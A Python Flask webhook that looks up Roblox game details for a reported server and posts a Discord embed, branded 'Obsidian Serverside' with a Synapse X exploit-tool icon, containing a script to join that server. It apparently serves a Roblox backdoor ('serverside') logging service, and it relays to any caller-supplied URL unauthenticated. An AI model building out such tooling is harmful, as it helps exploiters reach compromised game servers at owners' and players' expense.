import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# API endpoints remain the same
UNIVERSE_API = "https://apis.roblox.com/universes/v1/places/{}/universe"
GAMES_API = "https://games.roblox.com/v1/games?universeIds={}"
VOTES_API = "https://games.roblox.com/v1/games/votes?universeIds={}"
THUMBNAIL_API = "https://thumbnails.roblox.com/v1/games/icons?universeIds={}&size=256x256&format=Png&isCircular=false"

def format_number(n):
    """Formats a number with commas."""
    if isinstance(n, (int, float)):
        return f"{n:,}"
    return "N/A"

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    try:
        data = request.json
        place_id = data.get('placeId')
        job_id = data.get('jobId')
        player_count = data.get('playerCount')
        max_players = data.get('maxPlayers')
        discord_webhook_url = data.get('discordWebhookUrl')

        if not all([place_id, job_id, discord_webhook_url]):
            return jsonify({"error": "Missing required data"}), 400

        # --- Step 1: Get Universe ID ---
        universe_id_res = requests.get(UNIVERSE_API.format(place_id))
        universe_id_res.raise_for_status()
        universe_id = universe_id_res.json().get('universeId')

        if not universe_id:
            return jsonify({"error": "Could not find Universe ID"}), 404

        # --- Step 2: Get All Game Details ---
        game_details_res = requests.get(GAMES_API.format(universe_id))
        game_votes_res = requests.get(VOTES_API.format(universe_id))
        thumbnail_res = requests.get(THUMBNAIL_API.format(universe_id))
        
        game_details_res.raise_for_status()
        game_votes_res.raise_for_status()
        thumbnail_res.raise_for_status()

        details = game_details_res.json()['data'][0]
        votes = game_votes_res.json()['data'][0]
        thumbnail_url = thumbnail_res.json()['data'][0]['imageUrl']

        # --- Step 3: Build the New Discord Embed ---
        game_name = details.get('name', 'N/A')
        price = details.get('price')
        price_str = "Free" if price is None or price == 0 else f"{price} Robux"
        
        js_code = f"```js\nRoblox.GameLauncher.joinGameInstance({place_id}, \"{job_id}\");\n```"

        payload = {
            "embeds": [{
                "author": {
                    "name": "Obsidian Project",
                    "icon_url": "https://static.wikia.nocookie.net/logopedia/images/a/aa/Synapse_X_%28Icon%29.svg/revision/latest/scale-to-width-down/250?cb=20221129133252"
                },
                "title": "Obsidian Serverside",
                "color": 11290873, # Purple
                "thumbnail": {
                    "url": thumbnail_url
                },
                "fields": [
                    {"name": "Game", "value": f"[{game_name}](https://www.roblox.com/games/{place_id})", "inline": True},
                    {"name": "Active Players", "value": format_number(details.get('playing')), "inline": True},
                    {"name": "Players In Server", "value": f"{player_count}/{max_players}", "inline": True},
                    {"name": "Game Visits", "value": format_number(details.get('visits')), "inline": True},
                    {"name": "Game Version", "value": str(details.get('placeVersion', 'N/A')), "inline": True},
                    {"name": "Creator Name", "value": details.get('creator', {}).get('name', 'N/A'), "inline": True},
                    {"name": "Creator ID", "value": str(details.get('creator', {}).get('id', 'N/A')), "inline": True},
                    {"name": "Price", "value": price_str, "inline": True},
                    {"name": "Universe ID", "value": str(universe_id), "inline": True},
                    {"name": "Favorites", "value": format_number(details.get('favoritedCount')), "inline": True},
                    {"name": "Likes", "value": format_number(votes.get('upVotes')), "inline": True},
                    {"name": "Dislikes", "value": format_number(votes.get('downVotes')), "inline": True},
                    {"name": "Genre", "value": details.get('genre', 'N/A'), "inline": True},
                    {"name": "Voice Chat", "value": str(details.get('voiceEnabled', 'N/A')), "inline": True},
                    {"name": "Created", "value": f"`{details.get('created', 'N/A')}`", "inline": True},
                    {"name": "Updated", "value": f"`{details.get('updated', 'N/A')}`", "inline": True},
                    {"name": "JavaScript", "value": js_code, "inline": False},
                ],
                "footer": { "text": "Protected by Rewq" }
            }]
        }

        # --- Step 4: Send to Discord ---
        requests.post(discord_webhook_url, json=payload)
        return jsonify({"success": "Webhook sent!"}), 200

    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return jsonify({"error": "An internal server error occurred"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
